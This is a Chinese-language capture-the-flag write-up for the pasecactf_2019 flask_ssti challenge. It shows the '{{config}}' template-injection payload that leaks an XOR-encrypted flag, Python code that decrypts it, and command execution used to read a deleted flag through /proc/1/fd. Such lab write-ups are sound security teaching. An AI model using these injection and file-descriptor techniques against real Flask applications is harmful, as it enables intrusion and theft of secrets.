# [pasecactf_2019]flask_ssti proc ssti config

其实这个很简单

 [Linux的/proc/self/学习-CSDN博客](https://blog.csdn.net/cjdgg/article/details/119860355?spm=1001.2014.3001.5502) 

首先ssti直接fenjing一把锁了



<img src="https://i-blog.csdnimg.cn/blog_migrate/e57942fc8e7c820c726239a0aceaf47c.png" alt="" style="max-height:304px; box-sizing:content-box;" />


这里被加密后 存储在 config中了 然后我们去config中查看即可

```handlebars
{{config}}
```

可以获取到flag的值

```cobol
-M7\x10w@d94\x02!`-\x0eL\x0c;\x07(DKO\r\x17!2R4\x02\rO\x0bsT#-\x1c`@Z\x1dG
```

然后就可以写代码解密

```cobol
def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))
 
flag = "-M7\x10w@d94\x02!`-\x0eL\x0c;\x07(DKO\r\x17!2R4\x02\rO\x0bsT#-\x1c`@Z\x1dG"
 
flag = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
 
print(flag)
```

因为都是异或异或的异或就是 原本 所以不需要修改

就可以输出flag

## proc

还有另一个方法 存储在 proc中

首先我们可以执行命令了

查看一下进程 ps



<img src="https://i-blog.csdnimg.cn/blog_migrate/c01447fb66f0f45dc62aabd7c82c7274.png" alt="" style="max-height:304px; box-sizing:content-box;" />


发现app的进程在pid为1

我们去查看

```cobol
ls /proc/1/fd
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a3037ef9b7d13aae4b729ede5c198d5f.png" alt="" style="max-height:543px; box-sizing:content-box;" />


这里其实没有这么多 因为我靶场没有关 原本只有 1-5 所以我们开始访问 可以在3 获取到flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/05d272f84c099c7596c0b4363f3d1a2b.png" alt="" style="max-height:748px; box-sizing:content-box;" />


这里的原理

```cobol
fd是一个目录，里面包含着当前进程打开的每一个文件的描述符，然后虽然他把flag删掉了，但进程并没有关闭它，所以目录下 还是会有这个文件的文件描述符，通过这个文件描述符我们即可以得到被删除的文件的内容
```